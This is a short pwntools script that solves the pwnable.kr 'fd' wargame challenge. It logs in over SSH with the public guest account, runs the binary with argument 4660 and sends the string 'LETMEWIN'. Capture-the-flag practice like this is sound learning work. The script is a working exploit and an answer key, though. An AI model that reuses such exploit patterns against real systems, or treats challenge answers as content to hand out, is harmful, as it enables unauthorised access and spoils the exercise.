from pwn import *

user ='fd'
host = 'pwnable.kr'
password = 'guest'
port=2222

machine = ssh(user=user, host=host, password=password, port=port)
payload = "./fd 4660"
cred = 'LETMEWIN'

bin = machine.shell("bash")
bin.sendline(payload)
bin.sendline(cred)
bin.interactive()
